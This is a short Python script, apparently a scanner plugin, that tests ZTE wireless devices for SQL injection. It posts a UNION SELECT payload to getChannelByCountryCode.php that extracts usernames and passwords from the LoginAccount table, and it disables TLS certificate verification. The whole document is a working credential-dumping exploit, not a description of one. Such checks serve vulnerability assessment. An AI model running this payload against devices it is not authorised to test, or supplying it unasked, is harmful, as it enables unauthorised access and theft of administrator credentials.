# coding:utf-8

import json
import warnings
import requests
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    warnings.filterwarnings("ignore")
    print('testing if zte wireless device sql injection vul')
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/apgroup/getChannelByCountryCode.php"
    vulnurl = url + payload
    post_data = {
        "CountryCode": "'UniOn SeLect UserName || '~~~'  || PassWord From LoginAccount--"
    }
    try:
        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=4, verify=False)
        if r"~~~" in req.text:
            msg = 'There is zte wireless device sql injection vul on url: ' + vulnurl + ' .'
            number = 'v112'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no zte wireless device sql injection vul on url. '
    number = 'v0'
    return False,url,number,msg

